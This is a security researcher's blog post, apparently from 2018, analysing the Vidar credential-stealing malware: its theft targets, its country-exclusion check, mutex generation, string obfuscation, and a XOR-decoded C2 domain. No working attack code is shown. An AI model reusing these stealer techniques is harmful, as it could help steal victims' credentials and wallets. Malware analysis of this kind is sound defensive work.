<meta property="og:site_name" content="Fumik0_&#039;s box" />
<meta property="og:image" content="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Valknut.svg_.png?resize=1200%2C1200&#038;ssl=1" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="1200" />
<meta property="og:image:alt" content="" />
<meta property="og:locale" content="en_US" />
<meta name="twitter:text:title" content="Let&#8217;s dig into Vidar &#8211; An Arkei Copycat/Forked Stealer (In-depth analysis)" />
<meta name="twitter:image" content="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Valknut.svg_.png?resize=1200%2C1200&#038;ssl=1&#038;w=640" />
<meta name="twitter:card" content="summary_large_image" />

<!-- End Jetpack Open Graph Tags -->
<link rel="icon" href="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=32%2C26&#038;ssl=1" sizes="32x32" />
<link rel="icon" href="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=192%2C156&#038;ssl=1" sizes="192x192" />
<link rel="apple-touch-icon" href="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=180%2C146&#038;ssl=1" />
<meta name="msapplication-TileImage" content="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=249%2C202&#038;ssl=1" />

</head>
<body class="post-template-default single single-post postid-436 single-format-standard has-site-icon lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis">
	<div class="wrapper">
		<header class="header clear" role="banner">
			<div class="container">
				<nav class="navbar navbar-expand-lg navbar-dark " role="navigation">
										<a class="navbar-brand" href="https://fumik0.com">
						<img src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/05/saber.jpeg?fit=32%2C26&#038;ssl=1" alt="Logo" class="logo-img">
					</a>
					
											<div id="mynote-nav-bar" class="collapse navbar-collapse"><ul id="menu-primary" class="navbar-nav mr-auto"><li  id="menu-item-8"class="nav-item"><a href="/" class="nav-link">Home</a></li><li  id="menu-item-595"class="nav-item"><a href="http://tracker.fumik0.com" class="nav-link">Tracker</a></li><li  id="menu-item-786"class="nav-item"><a href="https://twitter.com/fumik0_" class="nav-link">Twitter</a></li><li  id="menu-item-9"class="nav-item"><a href="https://fumik0.com/about/" class="nav-link">About</a></li><li  id="menu-item-10"class="nav-item"><a href="https://fumik0.com/contact/" class="nav-link">Contact</a></li></ul></div>					
					<div class="search-bar">
						
<form id="search-form" class="search" method="get" action="https://fumik0.com" role="search" autocomplete="off">
	<input type="text" name="s" class="search-input" placeholder="To search, type and hit enter.">
	<span class="search-icon" onclick="document.getElementById('search-form').submit();"><i class="fas fa-search"></i></span>
</form>


					</div>
					
					<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#mynote-nav-bar" aria-controls="mynote-nav-bar" aria-expanded="false" aria-label="Toggle navigation">
						<span class="navbar-toggler-icon"></span>
					</button>
				</nav>
			</div><!-- .container -->
		</header>


		

		<div class="single-post-title-bar clear" role="banner">
			<div class="container">
				<nav class="navbar navbar-expand-lg navbar-dark" role="navigation">
					<a class="navbar-brand" href="https://fumik0.com"></a>
					<div id="progress-title"></div>
				</nav>
			</div>
			<div class="progress-wrapper">
				<div class="progress-label"></div>
				<progress></progress>
			</div>
		</div>
	
<div class="data-schema is-single" itemscope itemtype="http://schema.org/Article">
											<nav class="breadcrumb">
			<div class="container">
				<ul class="breadcrumb" itemscope itemtype="http://schema.org/BreadcrumbList">
					<li class="breadcrumb-item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
						<a href="https://fumik0.com" itemprop="item">
							<span itemprop="name"><i class="fas fa-globe"></i><span class="sr-only">Home</span></span>
						</a>
						<meta itemprop="position" content="1">
					</li>
										<li class="breadcrumb-item" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
						<a href="https://fumik0.com/category/reverse/" itemprop="item">
							<span itemprop="name">Reverse</span>
						</a>
						<meta itemprop="position" content="2">
					</li>
															<li class="breadcrumb-item active" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
						<span itemprop="name">Let&#8217;s dig into Vidar &#8211; An Arkei Copycat/Forked Stealer (In-depth analysis)</span>
						<meta itemprop="item" content="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/">
						<meta itemprop="position" content="3">
					</li>
				</ul>
			</div>
		</nav>
		
			<div class="single-post-header">
				<div class="container">

					<h1 id="post-title" itemprop="headline">Let&#8217;s dig into Vidar &#8211; An Arkei Copycat/Forked Stealer (In-depth analysis)</h1>
					<div class="post-mynote-buttons">

															<div class="btn-group column-control">
			<div class="btn-counter text-only active" data-target="#aside-container" role="button">		
				<div class="btn"><i class="fas fa-columns"></i></div>
			</div>
			<div class="btn-counter text-only" data-target="#sidebar" role="button">		
				<div class="btn"><i class="fas fa-list-ul"></i></div>
			</div> 
		</div>
							
												
		<a href="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/#comments" class="button-like-link">
			<div class="btn-counter">
				<div class="btn">
					<i class="fas fa-comment-dots"></i>
				</div>
				<div class="count-box">0</div>
			</div>
		</a>
						</div><!-- .post-mynote-buttons -->

											<div class="post-meta">
							<div class="author-posted-date"><img src="https://secure.gravatar.com/avatar/60460a1a0d00b32720a59ee2624bb4aa?s=40&#038;d=identicon&#038;r=g" class="rounded-circle poster-avatar" align="middle"> <a href="https://fumik0.com/author/fumko/" title="written December 24, 2018 @ 9:32 am" class="author-link">fumko</a> <time itemprop="datePublished" datetime="2018-12-24T09:32:01+00:00">written 6 years ago</time></div>						</div>
					
				</div><!-- .container -->
			</div><!-- .single-post-header -->

			
	<div class="container">
		<div class="row row-layout-choice-post">
			<main id="main-container" class="col-lg-8 col-md-8 col-sm-12" role="main">

				
					
						
						<article id="post-436" class="markdown-body post-436 post type-post status-publish format-standard has-post-thumbnail hentry category-reverse tag-reverse tag-stealer">

																	<figure>
			<img src="https://fumik0.com/wp-content/uploads/2018/12/Valknut.svg_.png" class="attachment- size- wp-post-image" alt="" itemprop="image" decoding="async" fetchpriority="high" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Valknut.svg_.png?w=1920&amp;ssl=1 1920w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Valknut.svg_.png?resize=300%2C279&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Valknut.svg_.png?resize=768%2C715&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Valknut.svg_.png?resize=1024%2C954&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Valknut.svg_.png?resize=1100%2C1024&amp;ssl=1 1100w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Valknut.svg_.png?w=1800&amp;ssl=1 1800w" sizes="(max-width: 1920px) 100vw, 1920px" data-attachment-id="508" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/valknut-svg/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Valknut.svg_.png?fit=1920%2C1788&amp;ssl=1" data-orig-size="1920,1788" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Valknut.svg" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Valknut.svg_.png?fit=300%2C279&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Valknut.svg_.png?fit=900%2C838&amp;ssl=1" />			<figcaption></figcaption>
		</figure>
								
							<div itemprop="articleBody">
								<p>Sometimes when you are reading tons and tons of log of malware analysis, you are not expecting that some little changes could be in fact impactful.</p>
<p>I paid the price when I was analyzing a supposed Arkei malware. my Yara rule at that time was supposed to trigger this malware, but after some reversing, I realized that I was confronted with something different. Some strings linked to Arkei signature was deleted and a new one appeared with the string &#8220;Vidar&#8221;, there are also some other tweaks in the in-depth analysis that proves there are some differences (but small), but all the rest was totally identical to Arkei.</p>
<p>The malware is written in C++, seems to have started activities at the beginning of October 2018 and have all the kind of classic features of stealers:</p>
<ul>
<li>Searching for specific documents</li>
<li>Stealing ID from cookie browsers</li>
<li>Stealing browser histories (also from <strong><span style="color: #ff0000;"><em>tor browser</em></span></strong>)</li>
<li>Stealing wallets</li>
<li><span style="color: #ff0000;"><em><strong>Stealing data from 2FA software</strong></em></span></li>
<li>Grabbing message from messenger software</li>
<li>Screenshot</li>
<li>Loader settings</li>
<li>Telegram notifications (on server-side)</li>
<li>Get a complete snapshot of all information of the computer victim</li>
</ul>
<p>Sold with a range of 250-700$, this stealer on shop/forums and when people buy it, they have access to a C2 Shop portal where they are able to generate their own payloads. So there is no management on their side. Also, domains who leads to the C2/Shop are changed every 4 days.</p>
<p>For this in-depth analysis, I will inspect the 4.1 version of Vidar, take an overview of the admin panel, catching the differences with Arkei.</p>
<h2>Basic Countries by-passing</h2>
<p>So first of all, we have some classic pattern to quit the program if the victim machines are configured in some language with the help of <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winnls/nf-winnls-getuserdefaultlocalename">GetUserDefaultLocaleName</a>. This is one of the easy tricks to check if the malware is not infected users from specific countries.</p>
<p><img data-recalc-dims="1" decoding="async" data-attachment-id="439" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/getuserdefaultlocalename/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/GetUserDefaultLocaleName.png?fit=363%2C97&amp;ssl=1" data-orig-size="363,97" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="GetUserDefaultLocaleName" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/GetUserDefaultLocaleName.png?fit=300%2C80&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/GetUserDefaultLocaleName.png?fit=363%2C97&amp;ssl=1" class=" size-full wp-image-439 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/GetUserDefaultLocaleName.png?resize=363%2C97&#038;ssl=1" alt="GetUserDefaultLocaleName" width="363" height="97" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/GetUserDefaultLocaleName.png?w=363&amp;ssl=1 363w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/GetUserDefaultLocaleName.png?resize=300%2C80&amp;ssl=1 300w" sizes="(max-width: 363px) 100vw, 363px" /></p>
<p>As explained in the MSDN, A &#8220;locale&#8221; is a collection of language-related user preference information represented as a list of values, the stealer will check if the language is corresponding with the list of countries that mentioned below.</p>
<p><img data-recalc-dims="1" decoding="async" data-attachment-id="438" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/checking_countries/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/checking_countries.png?fit=339%2C729&amp;ssl=1" data-orig-size="339,729" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="checking_countries" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/checking_countries.png?fit=140%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/checking_countries.png?fit=339%2C729&amp;ssl=1" class=" size-full wp-image-438 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/checking_countries.png?resize=339%2C729&#038;ssl=1" alt="checking_countries" width="339" height="729" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/checking_countries.png?w=339&amp;ssl=1 339w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/checking_countries.png?resize=140%2C300&amp;ssl=1 140w" sizes="(max-width: 339px) 100vw, 339px" /></p>
<p>With a few seconds of searching on google, it&#8217;s easy to understand which countries are behind the locale names :</p>
<table border="0" cellspacing="0">
<colgroup span="2" width="85"></colgroup>
<tbody>
<tr>
<td align="left" height="17">Locale</td>
<td align="left">Country</td>
</tr>
<tr>
<td align="left" height="17">ru-RU</td>
<td align="left">Russia</td>
</tr>
<tr>
<td align="left" height="17">be-BY</td>
<td align="left">Belarus</td>
</tr>
<tr>
<td align="left" height="17">uz-UZ</td>
<td align="left">Uzbekistan</td>
</tr>
<tr>
<td align="left" height="17">kk-KZ</td>
<td align="left">Kazhakstan</td>
</tr>
<tr>
<td align="left" height="17">az-AZ</td>
<td align="left">Azerbaijan</td>
</tr>
</tbody>
</table>
<p>LCID Structure &#8211; <a href="https://msdn.microsoft.com/en-us/library/cc233968.aspx">https://msdn.microsoft.com/en-us/library/cc233968.aspx</a><br />
Language Code Table &#8211; <a href="http://www.lingoes.net/en/translator/langcode.htm">http://www.lingoes.net/en/translator/langcode.htm</a><br />
LocaleName &#8211; <a href="https://docs.microsoft.com/fr-fr/windows/desktop/Intl/locale-names">https://docs.microsoft.com/fr-fr/windows/desktop/Intl/locale-names</a><br />
Locale &#8211; <a href="https://docs.microsoft.com/fr-fr/windows/desktop/Intl/locales-and-languages">https://docs.microsoft.com/fr-fr/windows/desktop/Intl/locales-and-languages</a></p>
<h2>Mutex generation</h2>
<p>The mutant string generated by Vidar is unique for each victim, but simple to understand how it is generated. This is just a concatenation of two strings :</p>
<ul>
<li>Hardware Profile ID</li>
</ul>
<p><a href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-getcurrenthwprofilea">GetCurrentHwProfileA</a> is used to retrieve the current hardware profile of the computer with the value of <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/ns-winbase-taghw_profile_infoa">szHwProfileGuid</a>. If it fails, it will return &#8220;Unknown&#8221; here.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="440" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/szhwprofileguid/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/szHwProfileGuid.png?fit=749%2C327&amp;ssl=1" data-orig-size="749,327" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="szHwProfileGuid" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/szHwProfileGuid.png?fit=300%2C131&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/szHwProfileGuid.png?fit=749%2C327&amp;ssl=1" class="alignnone  wp-image-440" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/szHwProfileGuid.png?resize=758%2C330&#038;ssl=1" alt="szHwProfileGuid" width="758" height="330" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/szHwProfileGuid.png?w=749&amp;ssl=1 749w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/szHwProfileGuid.png?resize=300%2C131&amp;ssl=1 300w" sizes="auto, (max-width: 758px) 100vw, 758px" /></p>
<ul>
<li>The Machine GUID</li>
</ul>
<p>With the help of <a href="https://docs.microsoft.com/en-us/windows/desktop/api/winreg/nf-winreg-regopenkeyexa">RegOpenKeyExA</a>, the value of the registry key  is fetched:</p>
<pre>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography\MachineGuid</pre>
<p>This is the <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa379358(v=vs.85).aspx">UUID</a> created by Windows during the installation of the operating system.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="441" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/machine_guid/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/machine_guid.png?fit=641%2C415&amp;ssl=1" data-orig-size="641,415" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="machine_guid" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/machine_guid.png?fit=300%2C194&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/machine_guid.png?fit=641%2C415&amp;ssl=1" class=" size-full wp-image-441 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/machine_guid.png?resize=641%2C415&#038;ssl=1" alt="machine_guid" width="641" height="415" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/machine_guid.png?w=641&amp;ssl=1 641w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/machine_guid.png?resize=300%2C194&amp;ssl=1 300w" sizes="auto, (max-width: 641px) 100vw, 641px" /></p>
<p>When it&#8217;s done, the mutex is created, just like this :</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="443" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/mutex/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Mutex.png?fit=887%2C134&amp;ssl=1" data-orig-size="887,134" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Mutex" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Mutex.png?fit=300%2C45&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Mutex.png?fit=887%2C134&amp;ssl=1" class=" size-full wp-image-443 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Mutex.png?resize=887%2C134&#038;ssl=1" alt="Mutex" width="887" height="134" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Mutex.png?w=887&amp;ssl=1 887w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Mutex.png?resize=300%2C45&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Mutex.png?resize=768%2C116&amp;ssl=1 768w" sizes="auto, (max-width: 887px) 100vw, 887px" /></p>
<h2>String setup</h2>
<p>When Vidar is entering in the main function, it needs to store some required strings to be able to work properly for some further steps.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="445" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_strings/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings.png?fit=901%2C247&amp;ssl=1" data-orig-size="901,247" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_strings" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings.png?fit=300%2C82&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings.png?fit=900%2C247&amp;ssl=1" class=" size-full wp-image-445 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings.png?resize=900%2C247&#038;ssl=1" alt="vidar_strings" width="900" height="247" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings.png?w=901&amp;ssl=1 901w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings.png?resize=300%2C82&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_strings.png?resize=768%2C211&amp;ssl=1 768w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>All the RVA address of each string are stored in the <em><strong>.data</strong></em> section. The malware will go there to access to the requested string.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="444" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/hexdump_strings/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/hexdump_strings.png?fit=538%2C216&amp;ssl=1" data-orig-size="538,216" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="hexdump_strings" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/hexdump_strings.png?fit=300%2C120&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/hexdump_strings.png?fit=538%2C216&amp;ssl=1" class=" size-full wp-image-444 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/hexdump_strings.png?resize=538%2C216&#038;ssl=1" alt="hexdump_strings" width="538" height="216" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/hexdump_strings.png?w=538&amp;ssl=1 538w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/hexdump_strings.png?resize=300%2C120&amp;ssl=1 300w" sizes="auto, (max-width: 538px) 100vw, 538px" /></p>
<p>This is a trick to slow down the static analysis of the malware, but this is really easy to surpass 🙂</p>
<h2>C2 Domain &amp; Profile ID</h2>
<p>When the malware is generated by the builder on the customer area. A unique ID is hardcoded into it. When Vidar will request this value on the malicious domain, it will retrieve the corresponding profile that the threat actor wants to grab/steal into the victim machine.</p>
<p>So on this case, this the profile ID is &#8220;178&#8221;. If there is no config on the malware, the profile ID &#8220;1&#8221; is hardcoded into it.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="497" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_profile_config/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_profile_config.png?fit=320%2C533&amp;ssl=1" data-orig-size="320,533" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_profile_config" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_profile_config.png?fit=180%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_profile_config.png?fit=320%2C533&amp;ssl=1" class=" size-full wp-image-497 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_profile_config.png?resize=320%2C533&#038;ssl=1" alt="vidar_profile_config" width="320" height="533" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_profile_config.png?w=320&amp;ssl=1 320w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_profile_config.png?resize=180%2C300&amp;ssl=1 180w" sizes="auto, (max-width: 320px) 100vw, 320px" /></p>
<p>The C2 domain is a simple XORed string, the key is directly put into the XOR function to decrypt the data.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="496" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_c2/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2.png?fit=381%2C484&amp;ssl=1" data-orig-size="381,484" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_c2" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2.png?fit=236%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2.png?fit=381%2C484&amp;ssl=1" class=" size-full wp-image-496 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2.png?resize=381%2C484&#038;ssl=1" alt="vidar_c2" width="381" height="484" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2.png?w=381&amp;ssl=1 381w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2.png?resize=236%2C300&amp;ssl=1 236w" sizes="auto, (max-width: 381px) 100vw, 381px" /></p>
<p>And decrypted it&#8217;s in fact &#8220;newagenias.com&#8221;</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="498" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_c2_decrypted/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2_decrypted.png?fit=976%2C126&amp;ssl=1" data-orig-size="976,126" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_c2_decrypted" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_c2_decrypted.png?fit=300%2C39&amp;ssl=1" 